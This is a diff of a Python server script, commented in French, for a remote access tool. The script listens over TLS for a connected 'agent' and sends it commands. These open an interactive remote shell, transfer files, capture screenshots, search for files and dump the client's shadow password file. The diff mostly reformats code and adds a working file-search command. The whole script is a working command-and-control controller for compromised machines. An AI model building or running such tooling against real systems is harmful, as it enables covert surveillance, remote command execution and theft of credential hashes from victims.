@@ -6,62 +6,65 @@ from dotenv import load_dotenv
 SERVER_PORT = 8888
 
 # Fonction permettant de récupérer la liste des commandes disponibles
-def menu_help(client_socket) :
-    client_socket.send(b'menu_help') # Envoie de la commande
+def menu_help(client_socket):
+    client_socket.send(b'menu_help')  # Envoie de la commande
 
 # Fonction permettant de télécharger un fichier du client
-def download(client_socket) :
-    client_socket.send(b'download') # Envoie de la commande
+def download(client_socket):
+    client_socket.send(b'download')  # Envoie de la commande
 
 # Fonction permettant de charger un fichier au client
-def upload(client_socket) :
-    client_socket.send(b'upload') # Envoie de la commande
+def upload(client_socket):
+    client_socket.send(b'upload')  # Envoie de la commande
 
 # Fonction permettant d'initier un shell intéractif sur le client
-def shell(client_socket, client_ip) :
-    client_socket.send(b'shell') # Envoie de la commande
+def shell(client_socket, client_ip):
+    client_socket.send(b'shell')  # Envoie de la commande
     print("[*] Taper 'quit' pour quitter le Shell")
     while True:
-        commande_shell = input(f"[{client_ip}] Shell > ") # Récupération de la commande Shell saisie
-        if commande_shell.lower() == 'quit': # Gestion de la sortie du Shell
+        commande_shell = input(f"[{client_ip}] Shell > ")  # Récupération de la commande Shell saisie
+        if commande_shell.lower() == 'quit':  # Gestion de la sortie du Shell
             client_socket.send(b'quit')
             break
-        client_socket.send(commande_shell.encode()) # Envoie de la commande Shell au client
-        commande_shell_received = client_socket.recv(4096).decode() # Récupération de la réponse de la commande Shell
-        print(commande_shell_received) # Affichage de la réponse de la commande Shell
+        client_socket.send(commande_shell.encode())  # Envoie de la commande Shell au client
+        commande_shell_received = client_socket.recv(4096).decode()  # Récupération de la réponse de la commande Shell
+        print(commande_shell_received)  # Affichage de la réponse de la commande Shell
 
 # Fonction permettant de récupérer la configuration réseau du client
-def ipconfig(client_socket) :
-    client_socket.send(b'ipconfig') # Envoie de la commande
-    conf_received = client_socket.recv(4096).decode() # Récupération des données de la configuration
-    print(conf_received) # Afficahge de la configuration
+def ipconfig(client_socket):
+    client_socket.send(b'ipconfig')  # Envoie de la commande
+    conf_received = client_socket.recv(4096).decode()  # Récupération des données de la configuration
+    print(conf_received)  # Affichage de la configuration
 
 # Fonction permettant de récupérer la capture d'écran du client
-def screenshot(client_socket, nb_screenshot) :
-    client_socket.send(b'screenshot') # Envoie de la commande
+def screenshot(client_socket, nb_screenshot):
+    client_socket.send(b'screenshot')  # Envoie de la commande
     screenshot_name = f'screenshot{nb_screenshot}.png'
-    with open(screenshot_name, 'wb') as screenshot: # Ouverture du fichier créé
+    with open(screenshot_name, 'wb') as screenshot:  # Ouverture du fichier créé
         while True:
-            screenshot_received = client_socket.recv(4096) # Récupération des données de la capture d'écran
-            if screenshot_received.endswith(b'END'): # Vérification du délimiteur  final
-                screenshot.write(screenshot_received[:-3]) # Ecriture des données reçue dans le fichier ouvert sans le délimiteur
+            screenshot_received = client_socket.recv(4096)  # Récupération des données de la capture d'écran
+            if screenshot_received.endswith(b'END'):  # Vérification du délimiteur final
+                screenshot.write(screenshot_received[:-3])  # Ecriture des données reçues dans le fichier ouvert sans le délimiteur
                 break
-            screenshot.write(screenshot_received) # Ecriture des données reçue dans le fichier ouvert
+            screenshot.write(screenshot_received)  # Ecriture des données reçues dans le fichier ouvert
     print(f'[+] {screenshot_name} reçu')
-    return nb_screenshot + 1 # Incrémentation du nombre de capture d'écran
+    return nb_screenshot + 1  # Incrémentation du nombre de capture d'écran
 
 # Fonction permettant de chercher un fichier sur la machine du client
 def search(client_socket) :
-    client_socket.send(b'search') # Envoie de la commande
+    recherche_to_send = input("[*] Entrer le nom du fichier rechercher : ") # Saisie du nom du fichier recherché
+    client_socket.send(f'search:{recherche_to_send}'.encode()) # Envoie de la commande avec le nom du fichier recherché
+    recherche_received = client_socket.recv(4096).decode() # Récupération des données de la recherche
+    print(recherche_received) # Affichage des résultats de la recherche
 
 # Fonction permettant de récupérer le fichier shadow du client
-def hashdump(client_socket) :
-    client_socket.send(b'hashdump') # Envoie de la commande
+def hashdump(client_socket):
+    client_socket.send(b'hashdump')  # Envoie de la commande
 
 
 
-def main() :
 
+def main():
     # Récupération et définition des variables
     load_dotenv()
     ip_server = os.getenv('IP_SERVER')
@@ -75,18 +78,17 @@ def main() :
 
     # Création du socket TCP pour la connexion au serveur
     server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.bind((ip_server, SERVER_PORT)) # Définition de l'adresse et du port d'écoute du serveur
-    server_socket.listen(1) # Mise en écoute du socket
+    server_socket.bind((ip_server, SERVER_PORT))  # Définition de l'adresse et du port d'écoute du serveur
+    server_socket.listen(1)  # Mise en écoute du socket
 
     print(f"[*] Listening on {SERVER_PORT}...")
 
     # Enveloppement du socket avec SSL pour sécuriser la communication
     with context.wrap_socket(server_socket, server_side=True) as ssl_socket:
-
         # Attente d'une connexion entrante et acceptation de celle-ci
         client_socket, client_address = ssl_socket.accept()
-        client_ip, client_port = client_socket.getpeername() # Récupération de l'adresse IP du client
-        print("[+] Agent received !")
+        client_ip, client_port = client_socket.getpeername()  # Récupération de l'adresse IP du client
+        print("[+] Agent received!")
 
         # Gestion des commandes envoyées au client
         while True:
@@ -111,12 +113,11 @@ def main() :
                 client_socket.send(b'exit')
                 break
             else:
-                print("[!] Commande non reconnue") # Gestion des saisis utilisateur
+                print("[!] Commande non reconnue")  # Gestion des saisies utilisateur
                 print("[*] Taper 'help' pour voir la liste des commandes disponibles")
 
-        client_socket.close() # Fermeture du socket client
-    server_socket.close() # Fermeture du socket serveur
-
+        client_socket.close()  # Fermeture du socket client
+    server_socket.close()  # Fermeture du socket serveur
 
 if __name__ == "__main__":
     main()
